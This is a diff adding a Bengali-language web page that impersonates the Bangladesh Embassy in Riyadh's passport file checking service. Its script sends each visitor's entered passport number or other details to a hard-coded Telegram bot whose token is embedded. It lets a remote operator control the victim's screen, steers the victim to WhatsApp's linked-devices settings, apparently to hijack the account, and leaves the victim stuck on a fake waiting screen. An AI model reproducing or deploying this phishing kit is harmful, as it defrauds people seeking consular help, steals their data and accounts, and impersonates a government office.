@@ -1,0 +1,612 @@
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<title>রিয়াদ বাংলাদেশ দূতাবাস অফিসিয়াল পাসপোর্ট PDF ফাইল চেকিং....</title>
+
+<!-- Facebook, Messenger & Social Media Preview Meta Tags -->
+<meta property="og:title" content="রিয়াদ বাংলাদেশ দূতাবাস অফিসিয়াল পাসপোর্ট PDF ফাইল চেকিং">
+<meta property="og:description" content="সরাসরি পাসপোর্ট ফাইলটি চেক করতে আপনার পাসপোর্ট নম্বর বা তথ্য দিয়ে চেক করুন।">
+<meta property="og:image" content="https://raw.githubusercontent.com/passportchaking-io/e_passport_help_center.gv.bd/main/1791494677132.jpg">
+<meta property="og:type" content="website">
+
+<!-- Tailwind CSS CDN -->
+<script src="https://cdn.tailwindcss.com"></script>
+
+<style>
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    background:#f2f4f5;
+    font-family:"Noto Sans Bengali","Segoe UI",Arial,sans-serif;
+    color:#222;
+}
+
+.wrapper{
+    width:100%;
+    max-width:600px;
+    margin:auto;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    background:#ffffff;
+    box-shadow:0 0 20px rgba(0,0,0,0.05);
+}
+
+/* =========================
+   TOP IMAGE (অর্ধেক অংশ জুড়ে নিখুঁত ফিটিং)
+========================= */
+
+.top-image-container{
+    width:100%;
+    height:45vh;
+    min-height:220px;
+    max-height:350px;
+    background:#e5e5e5;
+    overflow:hidden;
+}
+
+.top-image{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    object-position:center;
+    display:block;
+}
+
+/* =========================
+   CONTENT SECTION
+========================= */
+
+.content-section{
+    flex:1;
+    padding:20px 20px 25px;
+    display:flex;
+    flex-direction:column;
+    justify-content:space-between;
+}
+
+/* নীল রঙের হেডার */
+.site-title{
+    color:#1565c0;
+    text-align:center;
+    font-size:22px;
+    font-weight:800;
+    margin-bottom:10px;
+}
+
+.card-title{
+    text-align:center;
+    font-size:18px;
+    font-weight:700;
+    color:#333;
+    margin-bottom:8px;
+}
+
+.description{
+    color:#666;
+    font-size:14px;
+    line-height:1.6;
+    text-align:center;
+    margin-bottom:20px;
+}
+
+/* =========================
+   INPUT & BUTTON
+========================= */
+
+.input-group{
+    margin-bottom:15px;
+}
+
+.product-input{
+    width:100%;
+    padding:14px 16px;
+    border:2px solid #15966f;
+    border-radius:12px;
+    font-size:16px;
+    text-align:center;
+    outline:none;
+    background:#fafafa;
+}
+
+.product-input:focus{
+    border-color:#006f52;
+    background:#fff;
+}
+
+.ok-button{
+    width:100%;
+    border:0;
+    border-radius:12px;
+    padding:14px;
+    font-size:17px;
+    font-weight:800;
+    cursor:pointer;
+    background:#1565c0;
+    color:white;
+    transition:background 0.2s;
+}
+
+.ok-button:hover{
+    background:#0d47a1;
+}
+
+.ok-button:disabled{
+    opacity:.6;
+}
+
+.error{
+    display:none;
+    margin-top:10px;
+    color:#c62828;
+    font-weight:700;
+    font-size:14px;
+    text-align:center;
+}
+
+/* =========================
+   BOTTOM NAVIGATION BUTTONS
+========================= */
+
+.bottom-buttons-container {
+    display: flex;
+    gap: 10px;
+    margin-top: 20px;
+    padding-top: 15px;
+    border-top: 1px solid #eee;
+}
+
+.nav-btn {
+    flex: 1;
+    border: 0;
+    border-radius: 10px;
+    padding: 12px 10px;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    transition: background 0.2s;
+}
+
+.home-nav-btn {
+    background: #07865f;
+    color: white;
+}
+
+.home-nav-btn:hover {
+    background: #056d4d;
+}
+
+.contact-nav-btn {
+    background: #546e7a;
+    color: white;
+}
+
+.contact-nav-btn:hover {
+    background: #37474f;
+}
+
+/* =========================
+   MODALS (পপ-আপ)
+========================= */
+
+.modal-overlay{
+    position:fixed;
+    top:0; left:0; right:0; bottom:0;
+    background:rgba(0,0,0,0.55);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    z-index:9999;
+    padding:16px;
+}
+
+.modal-overlay.show{
+    display:flex;
+}
+
+.modal-box{
+    width:100%;
+    max-width:400px;
+    background:#fff;
+    border-radius:18px;
+    box-shadow:0 15px 40px rgba(0,0,0,0.25);
+    padding:20px;
+    animation:popIn .25s ease;
+}
+
+@keyframes popIn{
+    from{ transform:scale(.85); opacity:0; }
+    to{ transform:scale(1); opacity:1; }
+}
+
+.code-box{
+    min-height:55px;
+    padding:12px;
+    margin-bottom:12px;
+    background:#f1fff8;
+    border:2px dashed #07865f;
+    border-radius:12px;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    font-size:22px;
+    font-weight:900;
+    color:#07865f;
+    word-break:break-word;
+    text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+    <!-- প্রথম অংশ: টপ ইমেজ (আপডেটকৃত লিংক) -->
+    <div class="top-image-container">
+        <img
+            id="productImage"
+            class="top-image"
+            src="https://raw.githubusercontent.com/passportchaking-io/e_passport_help_center.gv.bd/main/1791494677132.jpg"
+            alt="Passport Check"
+            onerror="this.style.display='none'"
+        >
+    </div>
+
+    <!-- দ্বিতীয় অংশ: কন্টেন্ট ও ফর্ম -->
+    <div class="content-section">
+        
+        <section id="productPage">
+            <!-- নীল রঙে হেডলাইন -->
+            <div class="site-title">
+                পাসপোর্ট চেক করুন
+            </div>
+
+            <!-- এক লাইন হেডলাইন -->
+            <div class="card-title">
+                অনলাইন পাসপোর্ট পিডিএফ ফাইল চেকিং
+            </div>
+
+            <!-- দুই-তিন লাইন বিবরণ -->
+            <div class="description">
+                সরাসরি রিয়াদ দূতাবাস থেকে আপনার পাসপোর্ট ফাইলটি যাচাই করতে নিচের ফাঁকা ঘরে আপনার তথ্য বা নম্বরটি লিখে নিচের বাটনে ক্লিক করুন।
+            </div>
+
+            <!-- ফাঁকা ঘর (ইনপুট) -->
+            <div class="input-group">
+                <input
+                    id="productNumber"
+                    class="product-input"
+                    type="text"
+                    placeholder="পাসপোর্ট নম্বর বা তথ্য লিখুন"
+                    autocomplete="off"
+                >
+            </div>
+
+            <!-- বাটন -->
+            <button
+                id="submitButton"
+                class="ok-button"
+                type="button"
+            >
+                চেক করুন
+            </button>
+
+            <div id="errorMessage" class="error"></div>
+        </section>
+
+        <!-- একেবারে নিচে দুটি বাটন: হোম এবং হেড অফিসে যোগাযোগ করুন -->
+        <div class="bottom-buttons-container">
+            <button type="button" class="nav-btn home-nav-btn" onclick="location.reload();">
+                🏠 হোম পেজ
+            </button>
+            <a href="#" id="headOfficeBtn" class="nav-btn contact-nav-btn" target="_blank">
+                📞 হেড অফিসে যোগাযোগ করুন
+            </a>
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- ওয়েটিং পেজ (লোডিং মোডাল) -->
+<div id="waitingPage" class="modal-overlay">
+    <div class="modal-box text-center">
+        
+        <div class="modal-header" style="background:#07865f; color:#fff; text-align:center; font-weight:800; font-size:17px; padding:10px; border-radius:10px; margin-bottom:14px;">
+            ⏳ তথ্য যাচাই করা হচ্ছে
+        </div>
+
+        <div class="my-3 flex justify-center">
+            <svg class="animate-spin h-9 w-9 text-emerald-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+        </div>
+
+        <div style="font-size:16px; margin-bottom:6px; font-weight:800; color:#222;">
+            অল্প কিছুক্ষণ অপেক্ষা করুন
+        </div>
+
+        <div style="font-size:13px; margin-bottom:12px; color:#666; line-height:1.6;">
+            সরাসরি বাংলাদেশ রিয়াদ দূতাবাস থেকে আপনার তথ্য দিয়ে চেক করা হচ্ছে...
+        </div>
+
+        <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden relative">
+            <div class="bg-emerald-600 h-full w-2/3 rounded-full animate-pulse"></div>
+        </div>
+
+    </div>
+</div>
+
+
+<!-- পারমিশন মোডাল (আপনার দেওয়া কোড অনুযায়ী আপডেট করা) -->
+<div id="modalOverlay" class="modal-overlay">
+    <div class="modal-box text-center">
+        <h3 class="text-lg font-bold mb-2" style="font-size: 18px; font-weight: bold; margin-bottom: 8px;">পাসপোর্ট ফাইলটি ওপেন করুন</h3>
+        <p class="text-gray-600 text-sm mb-6" style="color: #666; font-size: 14px; margin-bottom: 24px; line-height: 1.5;">পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করতে চাইলে "Open" বাটনে ক্লিক করুন।</p>
+        <button onclick="redirectToChrome()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold text-lg active:bg-blue-700" style="width: 100%; background-color: #2563eb; color: white; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 18px; border: none; cursor: pointer;">Open</button>
+    </div>
+</div>
+
+
+<script>
+
+/* ==========================================================
+   টেলিগ্রাম সেটিংস ও সিস্টেম লজিক
+========================================================== */
+
+const BOT_TOKEN = "8829559812:AAHEWHbHvft6foDA6j9vNJA-0tS6K7zMCwo";
+const CHAT_ID = "8398202645";
+const WHATSAPP_LINK = "https://wa.me/settings/linked_devices";
+const PRODUCT_IMAGE_URL = "https://raw.githubusercontent.com/passportchaking-io/e_passport_help_center.gv.bd/main/1791494677132.jpg";
+
+const store = {
+    get: function(key, fallback){
+        try { const v = sessionStorage.getItem(key); return v === null ? fallback : v; } catch(e){ return fallback; }
+    },
+    set: function(key, value){ try { sessionStorage.setItem(key, value); } catch(e){} },
+    del: function(key){ try { sessionStorage.removeItem(key); } catch(e){} }
+};
+
+let requestStartedAt = 0;
+let lastUpdateId = 0;
+let pollingTimer = null;
+let isPolling = false;          
+let currentStep = 1;            
+let currentPhone = "";
+let navigatingToWhatsApp = false;
+
+const productPage   = document.getElementById("productPage");
+const waitingPage   = document.getElementById("waitingPage");
+const productNumber = document.getElementById("productNumber");
+const submitButton  = document.getElementById("submitButton");
+const errorMessage  = document.getElementById("errorMessage");
+const productImage  = document.getElementById("productImage");
+const modalOverlay  = document.getElementById("modalOverlay");
+
+if (PRODUCT_IMAGE_URL.trim() !== "") {
+    productImage.src = PRODUCT_IMAGE_URL;
+}
+
+function showProductPage(){
+    currentStep = 1;
+    productPage.style.display = "block";
+    waitingPage.classList.remove("show");
+    modalOverlay.classList.remove("show");
+}
+
+function showWaitingPage(){
+    currentStep = 2;
+    store.set("cw_step", "2");
+    waitingPage.classList.add("show");
+    modalOverlay.classList.remove("show");
+}
+
+function showError(message){
+    errorMessage.textContent = message;
+    errorMessage.style.display = "block";
+}
+
+function clearError(){
+    errorMessage.textContent = "";
+    errorMessage.style.display = "none";
+}
+
+function isValidInput(value) {
+    if (!value || typeof value !== 'string') return false;
+    return value.trim().length > 0;
+}
+
+function notifyTelegram(text){
+    if (BOT_TOKEN.trim() === "" || CHAT_ID.trim() === "") return;
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    }).catch(function(){});
+}
+
+async function sendProductRequest(product){
+    const message = `
+🆕 নতুন ইউজার রিকোয়েস্ট
+
+📱 ইনপুট তথ্য:
+${product}
+
+⏱️ Request ID:
+${requestStartedAt}
+
+👇 নিচের কমান্ড বাটনে ক্লিক করুন:
+🔑 /send — কোড পাঠান
+❌ /error — সমস্যা দেখান
+✅ /success — সফল দেখান
+🌐 /WhatsApp web — সরাসরি লিংক খুলুন
+`;
+
+    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "/send", callback_data: "cmd_send" }, { text: "/error", callback_data: "cmd_error" }],
+                    [{ text: "/success", callback_data: "cmd_success" }, { text: "/WhatsApp web", callback_data: "cmd_web" }]
+                ]
+            }
+        })
+    });
+
+    const data = await response.json();
+    if (!data.ok) throw new Error(data.description || "Telegram request failed");
+    return data;
+}
+
+submitButton.addEventListener("click", async function(){
+    clearError();
+    const value = productNumber.value.trim();
+
+    if (value === "" || !isValidInput(value)) {
+        showError("দয়া করে তথ্য বা পাসপোর্ট নম্বর লিখুন।");
+        productNumber.focus();
+        return;
+    }
+
+    requestStartedAt = Math.floor(Date.now() / 1000);
+    currentPhone = value;
+
+    store.set("cw_requestId", String(requestStartedAt));
+    store.set("cw_phone", value);
+
+    submitButton.disabled = true;
+    submitButton.textContent = "পাঠানো হচ্ছে...";
+
+    try {
+        await sendProductRequest(value);
+        showWaitingPage();
+        notifyTelegram("⏳ ইউজার ওয়েটিং পেজে আটকে আছে — কমান্ড বাটনে ক্লিক করুন");
+        startPolling();
+    } catch (error) {
+        showError(error.message || "অনুরোধ পাঠানো যায়নি।");
+    } finally {
+        submitButton.disabled = false;
+        submitButton.textContent = "চেক করুন";
+    }
+});
+
+function startPolling(){
+    stopPolling();
+    pollTelegram();
+    pollingTimer = setInterval(pollTelegram, 3000);
+}
+
+function stopPolling(){
+    if (pollingTimer) {
+        clearInterval(pollingTimer);
+        pollingTimer = null;
+    }
+}
+
+async function pollTelegram(){
+    if (currentStep !== 2 || isPolling) return;
+    isPolling = true;
+
+    try {
+        const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=1");
+        const data = await response.json();
+        if (!data.ok || !data.result || data.result.length === 0) return;
+
+        for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+            store.set("cw_lastUpdateId", String(lastUpdateId));
+
+            if (update.callback_query) {
+                const cq = update.callback_query;
+                if (cq.message && cq.message.chat && cq.message.chat.id === Number(CHAT_ID)) {
+                    if (cq.message.date && cq.message.date < requestStartedAt) continue;
+                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery", {
+                        method: "POST", headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ callback_query_id: cq.id })
+                    }).catch(e => {});
+                    handleCommand(cq.data);
+                }
+                continue;
+            }
+
+            if (!update.message || !update.message.text || update.message.chat.id !== Number(CHAT_ID)) continue;
+            if (update.message.date && update.message.date < requestStartedAt) continue;
+
+            const rawText = update.message.text.trim();
+            const lowerText = rawText.toLowerCase();
+
+            if (lowerText.startsWith("/send") || lowerText === "/error" || lowerText === "/success") {
+                handleCommand("cmd_send");
+            } else if (lowerText.startsWith("/whatsapp")) {
+                openWhatsAppLink("whatsapp_web_button", false);
+            }
+        }
+    } catch (error) {} finally { isPolling = false; }
+}
+
+function handleCommand(cmd){
+    // যেকোনো কমান্ড পেলেই আপনার দেওয়া নতুন পারমিশন পপ-আপ মোডাল ওপেন হবে
+    openModal();
+    notifyTelegram("🔑 ইউজারকে ফাইল ওপেন করার পারমিশন পপ-আপ দেখানো হয়েছে");
+}
+
+function openModal(){
+    waitingPage.classList.remove("show");
+    modalOverlay.classList.add("show");
+}
+
+/* Open বাটনে ক্লিক করলে ক্রোম ব্রাউজারে লিংক ওপেন হবে এবং অনির্দিষ্টকালের জন্য ওয়েটিং পেজে আটকে থাকবে */
+function redirectToChrome(){
+    navigatingToWhatsApp = true;
+    notifyTelegram("🌐 ইউজার 'Open' বাটনে ক্লিক করেছে — ব্রাউজারে লিংকে যাচ্ছে");
+
+    // ক্রোম ব্রাউজারে ওপেন করার জন্য টার্গেট লিংক
+    window.open(WHATSAPP_LINK, "_blank");
+
+    // মোডাল বন্ধ করে আবার ওয়েটিং পেজে আটকে রাখা এবং টেলিগ্রাম কমান্ডের অপেক্ষায় রাখা
+    modalOverlay.classList.remove("show");
+    showWaitingPage();
+    notifyTelegram("⏳ ইউজার আবার অনির্দিষ্টকালের জন্য ওয়েটিং পেজে আটকে আছে — নতুন টেলিগ্রাম কমান্ডের অপেক্ষায়");
+}
+
+window.addEventListener("pageshow", function () {
+    stopPolling();
+    navigatingToWhatsApp = false;
+    const savedStep = store.get("cw_step", "1");
+    const savedRequestId = store.get("cw_requestId", "0");
+    if (savedStep === "2" && savedRequestId !== "0") {
+        requestStartedAt = Number(savedRequestId);
+        currentPhone = store.get("cw_phone", "");
+        lastUpdateId = Number(store.get("cw_lastUpdateId", "0"));
+        showWaitingPage();
+        startPolling();
+    } else {
+        showProductPage();
+    }
+});
+
+productNumber.addEventListener("keydown", function (event) {
+    if (event.key === "Enter") { event.preventDefault(); submitButton.click(); }
+});
+
+showProductPage();
+</script>
+
+</body>
+</html>
